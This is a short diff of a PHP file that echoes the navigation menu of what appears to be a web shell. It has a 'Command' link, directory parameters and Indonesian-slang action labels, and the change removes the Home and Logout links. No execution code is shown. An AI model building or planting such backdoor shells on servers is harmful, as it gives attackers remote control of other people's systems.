@@ -166,8 +166,6 @@ echo "</td></tr>";
 echo "</table>";
 echo "<center>";
 echo "<center><table id='menu' width='990' border='0' cellpadding='0' cellspacing='0'><tr><td>";
-echo "<a class='destroy_table' href='?'>Home</a>";
-echo "<a class='destroy_table' href='?logout=true'>Logout</a>";
 echo "<a class='destroy_table' href='?dir=$dir&to=z4phy'>Gasspoll!</a>";
 echo "<a class='destroy_table' href='?dir=$dir&to=z4p'>Gasskeun!!</a><br>";
 echo "<a class='destroy_table' href='?dir=$dir&to=cmd'>Command</a>";
